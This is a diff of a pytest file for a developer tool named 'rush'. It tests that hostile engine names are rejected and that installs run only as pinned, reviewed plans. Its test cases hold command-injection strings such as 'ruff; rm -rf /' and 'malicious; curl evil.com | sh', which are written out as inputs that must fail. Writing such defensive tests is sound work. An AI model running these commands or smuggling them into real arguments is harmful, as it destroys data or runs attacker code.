@@ -14,7 +14,6 @@ from __future__ import annotations
 
 import subprocess
 from pathlib import Path
-from unittest.mock import patch
 
 import pytest
 from click.testing import CliRunner
@@ -27,46 +26,97 @@ from rush.setup.engine_packages import (
     UnknownEngineError,
     resolve_engine_package,
 )
-from rush.setup.provision import build_provision_plan
-from rush.tools.init_config import generate_initial_config
-from rush.tools.setup_wizard import (
-    PACKAGE_NAME_REGEX,
-    install_engine_package,
-    run_setup_wizard,
+from rush.setup.provision import (
+    build_provision_plan,
+    current_os_arch,
+    resolve_and_apply_provision_plan,
 )
+from rush.tools.init_config import generate_initial_config
+from rush.tools.setup_wizard import run_setup_wizard
 
 
-def test_package_name_regex_sanitization() -> None:
-    # Valid package names
-    assert PACKAGE_NAME_REGEX.match("ruff")
-    assert PACKAGE_NAME_REGEX.match("@biomejs/biome")
-    assert PACKAGE_NAME_REGEX.match("eslint-plugin-react")
-    assert PACKAGE_NAME_REGEX.match("pytest_mock")
+def test_package_name_allowlist_sanitization() -> None:
+    """Phase 70 T24 removed the regex-guarded ad-hoc installer; the only
+    install path is the engine allowlist. Valid engines resolve to their
+    canonical package identity; hostile strings never become a package."""
+    assert resolve_engine_package("ruff").package_id == "ruff"
+    assert resolve_engine_package("biome").package_id == "@biomejs/biome"
+    assert resolve_engine_package("eslint").package_id == "eslint"
+    assert resolve_engine_package("pytest").package_id == "pytest"
 
-    # Hostile / injection package names
-    assert not PACKAGE_NAME_REGEX.match("ruff; rm -rf /")
-    assert not PACKAGE_NAME_REGEX.match("ruff && calc.exe")
-    assert not PACKAGE_NAME_REGEX.match("`whoami`")
-    assert not PACKAGE_NAME_REGEX.match("pkg | bash")
-    assert not PACKAGE_NAME_REGEX.match("pkg > output.txt")
-
-
-def test_install_engine_package_rejection(tmp_path: Path) -> None:
-    with pytest.raises(ValueError, match="Invalid or hostile package name"):
-        install_engine_package("npm", "malicious; curl evil.com | sh", cwd=tmp_path)
-
-
-def test_install_engine_package_mock(tmp_path: Path) -> None:
-    import subprocess
-
-    with patch(
-        "rush.tools.setup_wizard.run_subprocess",
-        return_value=subprocess.CompletedProcess(
-            args=[], returncode=0, stdout="installed", stderr=""
-        ),
+    for hostile in (
+        "ruff; rm -rf /",
+        "ruff && calc.exe",
+        "`whoami`",
+        "pkg | bash",
+        "pkg > output.txt",
     ):
-        success = install_engine_package("uv", "ruff", cwd=tmp_path)
-        assert success is True
+        with pytest.raises(UnknownEngineError):
+            resolve_engine_package(hostile)
+
+
+def test_hostile_engine_name_rejected_before_any_effect(tmp_path: Path) -> None:
+    with pytest.raises(UnknownEngineError):
+        build_provision_plan(
+            tmp_path, ["malicious; curl evil.com | sh"], data_root=tmp_path / "data"
+        )
+    assert not (tmp_path / "data").exists()
+
+
+def test_engine_install_runs_pinned_typed_argv_through_provision(
+    tmp_path: Path,
+) -> None:
+    """A reviewed install succeeds only through apply_provision_plan, which
+    runs the manager with the frozen version as a typed argument list."""
+    import json
+
+    project = tmp_path / "proj"
+    project.mkdir()
+    data_root = tmp_path / "data"
+    calls: list[list[str]] = []
+
+    def fake_http_get(url: str) -> bytes:
+        return json.dumps(
+            {
+                "info": {"version": "1.0.0"},
+                "releases": {
+                    "1.0.0": [
+                        {
+                            "packagetype": "bdist_wheel",
+                            "url": "https://pypi/x.whl",
+                            "digests": {"sha256": "abc"},
+                        }
+                    ]
+                },
+            }
+        ).encode()
+
+    def fake_runner(
+        argv: list[str], env: dict[str, str] | None = None
+    ) -> subprocess.CompletedProcess[str]:
+        calls.append(list(argv))
+        assert env is not None
+        exe = Path(env["UV_TOOL_BIN_DIR"]) / "ruff"
+        exe.write_text("#!/bin/sh\necho ruff 1.0.0\n")
+        exe.chmod(0o755)
+        return subprocess.CompletedProcess(argv, 0, stdout="installed", stderr="")
+
+    plan = build_provision_plan(
+        project, ["ruff"], data_root=data_root, which=lambda name: "/usr/bin/uv"
+    )
+    result = resolve_and_apply_provision_plan(
+        plan,
+        ExecutionPermissions(network=True, download=True, cache_write=True),
+        project_id="p",
+        data_root=data_root,
+        http_get=fake_http_get,
+        runner=fake_runner,
+        prober=lambda argv: subprocess.CompletedProcess(argv, 0, "ruff 1.0.0", ""),
+        which=lambda name: "/usr/bin/uv",
+        current_platform=current_os_arch(),
+    )
+    assert "ruff" in result.applied
+    assert calls == [["uv", "tool", "install", "--force", "ruff==1.0.0"]]
 
 
 def test_generate_initial_config(tmp_path: Path) -> None:
@@ -176,6 +226,7 @@ def test_failed_install_never_reports_ready(tmp_path: Path) -> None:
         non_interactive=True,
         install=True,
         permissions=perms,
+        data_root=tmp_path / "data",
         http_get=fake_http_get,
         runner=fake_runner,
         prober=failing_prober,
@@ -186,3 +237,109 @@ def test_failed_install_never_reports_ready(tmp_path: Path) -> None:
         entry["code"] == "ENGINE_PROTOCOL_MISMATCH"
         for entry in result["provision"]["failed"].values()
     )
+
+
+def test_setup_saved_review_applies_non_interactively(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Phase 70 T24: `rush setup --json` is the reviewed payload; `--apply
+    --yes --plan-file --plan-id` applies exactly it with explicit grants."""
+    import json
+
+    from rush.setup.provision import default_data_root
+    from rush.workflows.projects import list_projects
+
+    monkeypatch.setenv("HOME", str(tmp_path / "home"))
+    monkeypatch.delenv("XDG_DATA_HOME", raising=False)
+    project = tmp_path / "proj"
+    project.mkdir()
+    runner = CliRunner()
+
+    preview = runner.invoke(cli, ["setup", str(project), "--json"])
+    assert preview.exit_code == 0, preview.output
+    payload = json.loads(preview.output)
+    review_id = payload["review"]["review_id"]
+    assert payload["apply_flags"] == ["--allow-cache-write", "--allow-artifact-write"]
+    plan_file = tmp_path / "review.json"
+    plan_file.write_text(preview.output, encoding="utf-8")
+
+    wrong = runner.invoke(
+        cli,
+        [
+            "setup",
+            str(project),
+            "--apply",
+            "--yes",
+            "--plan-file",
+            str(plan_file),
+            "--plan-id",
+            "0" * 64,
+            "--allow-cache-write",
+            "--allow-artifact-write",
+            "--json",
+        ],
+    )
+    assert wrong.exit_code == 2
+    assert json.loads(wrong.output)["reason"] == "plan_id_mismatch"
+
+    denied = runner.invoke(
+        cli,
+        [
+            "setup",
+            str(project),
+            "--apply",
+            "--yes",
+            "--plan-file",
+            str(plan_file),
+            "--plan-id",
+            review_id,
+            "--json",
+        ],
+    )
+    assert denied.exit_code == 1
+    assert json.loads(denied.output)["status"] == "permission_denied"
+    assert not (project / "rush.toml").exists()
+
+    applied = runner.invoke(
+        cli,
+        [
+            "setup",
+            str(project),
+            "--apply",
+            "--yes",
+            "--plan-file",
+            str(plan_file),
+            "--plan-id",
+            review_id,
+            "--allow-cache-write",
+            "--allow-artifact-write",
+            "--json",
+        ],
+    )
+    assert applied.exit_code == 0, applied.output
+    assert json.loads(applied.output)["status"] == "ok"
+    assert (project / "rush.toml").read_text(encoding="utf-8") == payload["review"][
+        "config"
+    ]["content"]
+    [view] = list_projects(data_root=default_data_root())
+    assert view["root"] == str(project.resolve())
+    assert view["configured"] is True
+
+    replay = runner.invoke(
+        cli,
+        [
+            "setup",
+            str(project),
+            "--apply",
+            "--yes",
+            "--plan-file",
+            str(plan_file),
+            "--plan-id",
+            review_id,
+            "--allow-cache-write",
+            "--allow-artifact-write",
+            "--json",
+        ],
+    )
+    assert replay.exit_code == 1
+    assert json.loads(replay.output)["status"] == "recovery_required"
